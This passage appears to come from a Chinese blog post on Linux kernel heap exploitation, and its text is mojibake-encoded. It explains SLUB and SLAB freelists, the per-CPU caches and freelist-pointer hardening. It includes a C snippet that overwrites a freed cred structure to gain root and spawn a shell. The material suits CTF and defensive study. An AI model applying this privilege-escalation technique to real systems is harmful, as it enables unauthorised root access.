<p>è€Œåœ¨åªæœ‰ä¸€ç»´ç©ºé—´çš„<code>kmalloc_caches</code>ä¸­ï¼Œå³ä¸å­˜åœ¨<code>kmalloc-rcl</code>å’Œ<code>dma-kmalloc</code>çš„ç‰ˆæœ¬ä¸‹ï¼Œæ¯”å¦‚4.19.98</p>
<p>å¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œä¹Ÿæ˜¯å¾ˆé¡ºåˆ©åœ°æ”¾å…¥CPU3å¯¹åº”çš„<code>kmalloc-32</code>çš„<code>freelist</code>ä¸­</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141222234.png" alt="image-20220314122243323"></p>
<p>ä½†æ˜¯CPUä¸ªæ•°çš„ä¸åŒï¼Œåˆ†é…çš„åŸºåœ°å€é€šå¸¸ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå…·ä½“è¿˜æ˜¯çœ‹<code>__per_cpu_offset</code>è¿™ä¸ªå…¨å±€å˜é‡ä¸­ä¿å­˜çš„å†…å®¹å§ï¼Œå…·ä½“çš„ç»†èŠ‚ä¸å¤ªçŸ¥é“</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162010972.png" alt="image-20220316201020862"></p>
<p>å¦‚å›¾ä¸º4ä¸ªCPUçš„æƒ…å†µï¼Œè¿™ä¸ªè¿˜æ˜¯ä¸å¤ªä¸€æ ·çš„ã€‚</p>

        <h5 id="å¤šç»´kmalloc-caches"   >
          <a href="#å¤šç»´kmalloc-caches" class="heading-link"><i class="fas fa-link"></i></a><a href="#å¤šç»´kmalloc-caches" class="headerlink" title="å¤šç»´kmalloc_caches"></a>å¤šç»´kmalloc_caches</h5>
      <p><code>kmalloc_caches[0][1]~kmalloc_caches[0][13]</code>ä¸º<code>kmalloc-8</code>~`kmalloc-8k`</p>
<p><code>kmalloc_caches[1][1]~kmalloc_caches[1][13]</code>ä¸º<code>kmalloc-rcl-8</code>~`kmalloc-rcl-8k`</p>
<p><code>kmalloc_caches[2][1]~kmalloc_caches[2][13]</code>ä¸º<code>dma-kmalloc-8</code>~`dma-kmalloc-8k`</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131600906.png" alt="image-20220313160048795"></p>
<p>å†…å­˜ç®¡ç†å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131521126.png" alt="img"></p>
<p>åœ¨äºŒç»´ç©ºé—´çš„<code>kmalloc_caches</code>ä¸‹ï¼Œä¾æ®CPUçš„ä¸åŒï¼Œæœ‰ä¸åŒçš„<code>freelist</code>ï¼Œæ¯”å¦‚åœ¨æœ‰4ä¸ªCPUçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ç¨‹åºç»‘å®šåœ¨CPU3ä¸Šï¼Œå¦‚ä¸Šé¢æåˆ°çš„ä¸€æ ·</p>
<p>qemuå¯åŠ¨æ•ˆæœä¹‹åï¼Œè¾“å…¥topï¼Œæ•ˆæœå¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141202734.png" alt="image-20220314120253236"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„<code>itExp</code>ç¨‹åºç»‘å®šçš„CPU3åˆ†é…åˆ°çš„åŸºåœ°å€å³ä¸º<code>0xffff88800f380000</code>ï¼Œç»“åˆ<code>kmalloc_caches</code>ä¸­å¯¹åº”<code>kmalloc-xxx</code>ä¸‹çš„<code>cpu_slab.freelist </code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203141209330.png" alt="image-20220314120914190"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬çš„<code>kmalloc-32</code>çš„<code>freelist</code>å³ä¸º<code>0xffff88800f380000+0x2d260</code>ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬é‡Šæ”¾çš„chunkç¡®å®æ˜¯æ”¾å…¥äº†CPU3ä¸Šå¯¹åº”çš„<code>kmalloc-32</code>çš„<code>freelist</code>ä¸­</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162026812.png" alt="image-20220316202605604"></p>
<p>å½“ç„¶ï¼Œåœ¨SLUBåˆ†é…ä¸‹ï¼Œç”±äºFDæŒ‡é’ˆçš„å­˜åœ¨ï¼Œfreelistæ›´åƒæ˜¯ä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œfreelistä¸­çš„ç¬¬ä¸€ä¸ªchunkä½œä¸ºé“¾è¡¨å¤´ä¾æ®FDæŒ‡é’ˆä¸²è”èµ·æ•´ä¸ªfreelist</p>

        <h4 id="ä»…SLABä¸‹"   >
          <a href="#ä»…SLABä¸‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä»…SLABä¸‹" class="headerlink" title="ä»…SLABä¸‹"></a>ä»…SLABä¸‹</h4>
      <p>åŒæ ·ä¹Ÿå…·å¤‡å¤šç»´æˆ–è€…ä¸€ç»´çš„<code>kmalloc_caches</code></p>
<p><code>kmalloc_caches[0][1]~kmalloc_caches[0][2]</code>ä¸º<code>kmalloc-96~kmalloc-192</code></p>
<p><code>kmalloc_caches[0][3]~kmalloc_caches[0][4]</code>ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰</p>
<p><code>kmalloc_caches[0][5]~kmalloc_caches[0][22]</code>ä¸º<code>kmalloc-32~kmalloc-4M</code></p>
<p>åŒç†å¯¹åº”çš„å¤šç»´å’Œä¸€ç»´ä¹Ÿæ˜¯ç±»ä¼¼çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203131601774.png" alt="image-20220313160119681"></p>
<p>åˆ†é…æ–¹å¼ä¸Šæœ‰ç‚¹ä¸åŒï¼Œå…·ä½“çš„æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥å‚è€ƒå¦‚ä¸‹ï¼š</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/liuhangtiant/category_7929217.html" >(41æ¡æ¶ˆæ¯) slabå†…å­˜ç®¡ç†æ–¹æ¡ˆå­¦ä¹ è®°å½•_liuhangtiantçš„åšå®¢-CSDNåšå®¢</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™ç§æƒ…å†µä¸‹çš„Chunkå…¶å®ä¸å¸¦FDæŒ‡é’ˆçš„ï¼Œæ‰€ä»¥åªç”¨äº<code>freelist</code>ä¸Šå³å¯ï¼Œç®€å•æ¥è¯´ï¼Œslabçš„<code>freelist</code>æ›´åƒæ˜¯ä¸€ä¸ªæ•°ç»„è¿›è¡Œç´¢å¼•ã€‚</p>
<ul>
<li>é¦–å…ˆæ‰¾åˆ°ç´¢å¼•ï¼Œä¹Ÿå°±æ˜¯<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.avail</code>å¯¹åº”çš„å€¼ï¼Œä»¥<code>CPU3</code>å’Œ<code>kmalloc-1024</code>ä¸ºä¾‹ï¼š</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162039052.png" alt="image-20220316203909895"></p>
<ul>
<li>ç„¶åå†æ‰¾åˆ°<code>freelist</code>çš„åœ°å€ï¼Œå³<code>CPUX_addr + kmalloc_caches[xx][xx].cpu_cache.entry</code></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162040465.png" alt="image-20220316204056370"></p>
<p>å…¶å®é€šè¿‡è§‚å¯Ÿæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ<code>entry</code>å…¶å®ä¹Ÿå°±æ˜¯<code>cpu_cache+0x10</code>è€Œå·²ã€‚é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¾—åˆ°freelistçš„åœ°å€ï¼Œå°±å°†å…¶å½“ä½œä¸€ä¸ªæ•°ç»„è¿›è¡Œå–ç”¨ï¼Œæ¯”å¦‚è¿™é‡Œçš„ç´¢å¼•idxä¸º2ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸‹ä¸€æ¬¡åˆ†é…å°±ä¼šå–freelist[2]è¿™ä¸ªobjï¼Œä½†æ˜¯è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œè¿™ä¸ªç´¢å¼•æ˜¯ä»1å¼€å§‹çš„ï¼Œå¦‚ä¸‹ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162046044.png" alt="image-20220316204603914"></p>
<p>ä¸‹ä¸€æ¬¡åˆ†é…å–åˆ°<code>chunk</code>æ˜¯<code>0xffff88800d538400</code>è€Œé<code>0xffff88800d538c00</code>ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªç´¢å¼•idxæ›´åƒæ˜¯ä¸€ä¸ªè®¡æ•°ï¼Œè¡¨ç¤ºè¿˜å‰©2ä¸ªchunkå¯ç”¨ï¼Œä»å°¾éƒ¨å¼€å§‹å–ç”¨</p>

        <h5 id="ğŸ”ºæ³¨ï¼š"   >
          <a href="#ğŸ”ºæ³¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h5>
      <p>å½“ç„¶ä»¥ä¸Šçš„æƒ…å†µå®é™…æ“ä½œèµ·æ¥å¤ªéº»çƒ¦ï¼Œè¿˜ä¸å¦‚å†™ä¸ªå°æ’ä»¶ï¼Œè‡ªå·±è¿›è¡Œè®¡ç®—</p>
<p>å‚è€ƒè‡ªå·±å†™çš„å°å·¥å…·ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/kernelAll" >PIG-007/kernelAll (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h6 id="SLABï¼š"   >
          <a href="#SLABï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLABï¼š" class="headerlink" title="SLABï¼š"></a>SLABï¼š</h6>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162049003.png" alt="image-20220316204859800"></p>

        <h6 id="SLUBï¼š"   >
          <a href="#SLUBï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#SLUBï¼š" class="headerlink" title="SLUBï¼š"></a>SLUBï¼š</h6>
      <p>è¿™ä¸ªå¸¦ä¸Šäº†è®¡ç®—swabå’Œrandomå€¼å¾—åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯å¼€å¯äº†hardençš„æƒ…å†µä¸‹ï¼Œå½“ç„¶ä¹Ÿè¿˜æœ‰FDåç§»ä½ç½®æ”¹å˜çš„æƒ…å†µï¼Œä¸è¿‡éœ€è¦è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203162051067.png" alt="image-20220316205100876"></p>

        <h3 id="ä¿®æ”¹credç»“æ„ä½“"   >
          <a href="#ä¿®æ”¹credç»“æ„ä½“" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹credç»“æ„ä½“" class="headerlink" title="ä¿®æ”¹credç»“æ„ä½“"></a>ä¿®æ”¹credç»“æ„ä½“</h3>
      <p>è¿™ä¸ªå°±ä¸ç”¨è¯´å¤ªå¤šï¼Œé€šå¸¸æ˜¯0xa8å¤§å°çš„ç»“æ„ä½“ï¼Œæ¸…ç©ºå‰28å­—èŠ‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> credBuf[<span class="number">0xa8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">addFun(fd,<span class="number">0xa8</span>,credBuf);</span><br><span class="line">freeFun(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">idFork = fork();</span><br><span class="line"><span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">    editFun(fd,<span class="number">0</span>,<span class="number">28</span>,credBuf);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="ä¿®æ”¹FDç”³è¯·"   >
          <a href="#ä¿®æ”¹FDç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¿®æ”¹FDç”³è¯·" class="headerlink" title="ä¿®æ”¹FDç”³è¯·"></a>ä¿®æ”¹FDç”³è¯·</h3>
      
        <h4 id="1-HARDENEDä¿æŠ¤"   >
          <a href="#1-HARDENEDä¿æŠ¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HARDENEDä¿æŠ¤" class="headerlink" title="(1)HARDENEDä¿æŠ¤"></a>(1)HARDENEDä¿æŠ¤</h4>
      <p>ä¸è¿‡ä»4.14çš„å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼Œå°±å­˜åœ¨<code>freelist_ptr</code>åŠ å¯†äº†ï¼Œä¸è¿‡éœ€è¦åœ¨ç¼–è¯‘å†…æ ¸çš„æ—¶å€™åŠ å…¥<code>CONFIG_SLAB_FREELIST_HARDENED</code>é€‰é¡¹æ¥å¯ç”¨ï¼Œå¹¶ä¸”åŠ å¯†å½¢å¼åœ¨ä¸åŒç‰ˆæœ¬ä¸å¤ªä¸€æ ·ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.14</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.16</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„<code>ptr</code>å³å½“å‰é‡Šæ”¾çš„chunkåœ°å€ï¼Œptr_addrä¸ºæŒ‡å‘ä¸‹ä¸€ä¸ªfree_chunkçš„åœ°å€ï¼Œæ‰€ä»¥ä¸­é—´ç›¸å½“äºæœ‰ä¸€ä¸ªrandomå€¼ä¸çŸ¥é“ã€‚è¿™ä¸ªå€¼åœ¨<code>linux/slub_def.h</code>ä¸­è¢«å®šä¹‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>å¹¶ä¸”åœ¨<code>mm/slub.c</code>ä¸­çš„<code>kmem_cache_open</code>å‡½æ•°ä¸­è¢«èµ‹å€¼</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>

<p>å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>è¿™é‡Œéœ€è¦æˆ‘ä»¬è·å¾—randomçš„å€¼ï¼Œè¿™ä¸ªå€¼ä¿å­˜åœ¨å¯¹äºsizeçš„kmem_cacheä¸­ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰åœ¨<code>/linux/slub_def.h</code>ä¸­å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.17</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reserved;		<span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¹¶ä¸”ä¸åŒsizeçš„kmem_cacheå¯¹åº”çš„randomä¸åŒã€‚</p>
<p>åœ¨æœ‰DEBUGä¿¡æ¯çš„å†…æ ¸ä¸­ï¼Œæˆ‘ä»¬å°è¯•å¯»æ‰¾0x10å¤§å°çš„kmem_cacheæ¯”å¦‚æˆ‘ä»¬å¯»æ‰¾0x10å¤§å°çš„å°±éœ€è¦åœ¨ä¿å­˜æ‰€æœ‰kmem_cacheçš„å…¨å±€å˜é‡ç»“æ„kmalloc_cachesä¸­å¯»æ‰¾ï¼Œä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¥½åƒå¾ˆå¤šæ—¶å€™ä¸æ˜¯æŒ‰ç…§é¡ºåºæ¥æ’å¸ƒçš„ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾kmalloc-16ï¼Œä½†æ˜¯è¿™é‡Œå®ƒçš„ç´¢å¼•ä¸º4ï¼Œè€Œä¸æ˜¯2ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png" alt="image-20220116152127879"></p>
